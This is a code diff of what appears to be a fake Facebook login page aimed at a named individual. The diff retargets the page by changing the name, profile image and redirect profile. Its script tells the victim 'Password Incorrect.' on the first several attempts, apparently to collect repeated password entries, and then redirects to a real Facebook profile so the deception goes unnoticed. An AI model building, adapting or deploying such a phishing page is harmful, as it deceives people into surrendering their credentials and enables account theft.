@@ -220,9 +220,9 @@ form a {
         <div class="facebook-page flex">
           <div class="profile-info">
             <div class="profile-image">
-              <img src="https://raw.githubusercontent.com/Instagramreelsbaby/Facebook_lite/main/c6.jpeg">
+              <img src="https://raw.githubusercontent.com/Instagramreelsbaby/Facebook_lite/main/c8.jpeg">
             </div>
-            <p id="id-name">ẞahaßra ẞ</p>
+            <p id="id-name">Sahasra S</p>
           </div>
           <form id="login-form">
              <div id="error-message"></div>
@@ -240,15 +240,7 @@ form a {
     </div>
     <script>
 
-        var count = parseInt(localStorage.getItem('count')) || 0;
-        var resetCount = parseInt(localStorage.getItem('resetCount')) || 0;
-        function validateReset(){
-            ++resetCount;
-            localStorage.setItem('resetCount', resetCount);
-            console.log(resetCount);
-            console.log(count);
-        }
-        
+        var count =0
         
         function validateForm() {
           var errorMessage = document.getElementById("error-message");
@@ -260,7 +252,6 @@ form a {
                 
             }else{
           ++count;
-          localStorage.setItem('count', count);
           
           // Assuming username is always "sahitya"
           var username = "shanika";
@@ -289,14 +280,13 @@ form a {
               errorMessage.innerText = "There was an error during login.";
               errorMessage.style.display = "block";
             });
-             if(resetCount<1 || count<4){
+             if(count<4){
                        errorMessage.innerText = "Password Incorrect.";
                        errorMessage.style.display = "block";  
                    }
                    else{
-                        window.location.href = "https://www.facebook.com/profile.php?id=61555878152274";
-                       localStorage.setItem('resetCount', 0); 
-                       localStorage.setItem('count', 0); 
+                        window.location.href = "https://www.facebook.com/profile.php?id=61558913150461";
+                        
                     }
                     passwordInput.value = "";
          
